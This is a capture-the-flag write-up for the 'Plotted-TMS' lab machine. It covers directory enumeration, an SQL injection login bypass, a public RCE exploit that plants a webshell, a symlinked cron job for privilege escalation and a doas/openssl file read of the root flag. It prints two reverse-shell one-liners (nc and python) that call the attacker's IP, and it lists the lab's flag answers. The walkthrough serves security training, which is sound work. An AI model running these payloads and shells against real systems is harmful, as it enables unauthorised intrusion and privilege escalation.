# Plotted-TMS - Easy

```shell
nmap -T4 -p- -A -Pn -v 10.10.85.183

gobuster dir -u http://10.10.85.183 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,bak,js,json,docx,pdf,zip,sh,pl,xml,sql -t 50

gobuster dir -u http://10.10.85.183:445 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,bak,js,json,docx,pdf,zip,sh,pl,xml,sql -t 50

#for recursive scanning
feroxbuster -u http://10.10.85.183:445/management -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,bak,js,txt,json,docx,pdf,zip,cgi,sh,pl,aspx,sql,xml --extract-links --scan-limit 2 --filter-status 400,401,404,405,500 --silent

#modify exploit for TOMS v1.0 rce
vim 50221.py

python2 50221.py
#run exploit
#this uploads web shell

nc -nvlp 4444
#execute reverse-shell command on webshell
#this gives us shell

python3 -c 'import pty;pty.spawn("/bin/bash")'

id
#www-data

#check cronjobs
cat /etc/crontab

#check script run as plot_admin
cat /var/www/scripts/backup.sh

ls -la /home/plot_admin/tms_backup
#permission denied

ls -la /var/www/scripts
#we have write access to directory

cd /var/www/scripts

#create another script
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.14.31.212 4445 >/tmp/f" > evil.sh

chmod +x evil.sh

#symbolic link evil.sh to backup.sh
ln -sf evil.sh backup.sh

#setup listener
nc -nvlp 4445

#after a minute, the cron job runs
#we get reverse shell

cd /home/plot_admin
#get user flag

#run linpeas to check for privesc

#check doas.conf
cat /etc/doas.conf
#we can run openssl as root

#get exploit from GTFObins
#file read
LFILE="/root/root.txt"

doas -u root openssl enc -in "$LFILE"
```

* Open ports & services:

  * 22 - ssh - OpenSSH 8.2p1
  * 80 - http - Apache httpd 2.4.41
  * 445 - http - Apache httpd 2.4.41

* The webpage on port 80 is the default Apache landing page; we can check for hidden directories.

* Now, we are able to find /admin directory, which contains 'id_rsa' file - this leads us to base64 text.

* When decoded, it shows that this was a red herring; we will have to continue our enumeration process.

* We find other directories - /shadow and /passwd - but this also contains a similar base64 that tells us to enumerate further.

* Meanwhile, we can check the webpage on port 445 - this also happens to be a default Apache page.

* We can enumerate the webpage on port 445 for any hidden directories.

* Now, we find /management on port 445 - this leads us to another page.

* We can enumerate this directory recursively using ```feroxbuster```; this gives us some interesting directories inside /management:

  * /about
  * /uploads
  * /pages
  * /admin
  * /assets
  * /database
  * /plugins
  * /classes

* Now, /database contains a .sql file, which contains password hashes for 2 users 'admin' and 'jsmith'.

* Both these MD5 hashes can be cracked, giving us the creds admin:admin123 and jsmith:jsmith123

* We can use both these creds to login at /admin, but it does not work.

* We can attempt injection to bypass login; SQL injection works and using the payload ```' or 1=1 limit 1 -- -+```, we are able to login.

* Now, we have access to the management system dashboard as admin user - we have to look for ways to get reverse shell.

* On searching for 'toms v1.0 exploit', we get RCE exploits for the same.

* Now, we are unable to receive reverse shell through exploit; however it does upload 'evil.php' webshell.

* So we can navigate to the link given by the exploit - webshell is uploaded in /management/uploads/evil.php

* In webshell, we can run commands like '/evil.php?cmd=id' - this shows we are user 'www-data'.

* With the help of the following reverse-shell one-liner, we get reverse shell on our listener:

```python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.14.31.212",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'```

* Now, checking the cronjobs running on the machine, we can see that it is running a backup script every minute as 'plot_admin'.

* However, we are unable to edit the script contents, so we can check for what it is doing.

* Now, we do not have write access to the script, but we have write access to directory.

* We can create another script in the same directory, and create a soft link to backup.sh, so that our evil script runs.

* Now, we have shell as plot_admin user, we can get user flag now.

* We can run ```linpeas.sh``` to check for privesc.

* Now, linpeas checks 'doas.conf' and it shows that we can run openssl as root without password.

* We can check for exploit from GTFObins - it has a file read exploit for ```openssl```, so we can use that to read root flag.

```markdown
1. What is user.txt? - 77927510d5edacea1f9e86602f1fbadb

2. What is root.txt? - 53f85e2da3e874426fa059040a9bdcab
```
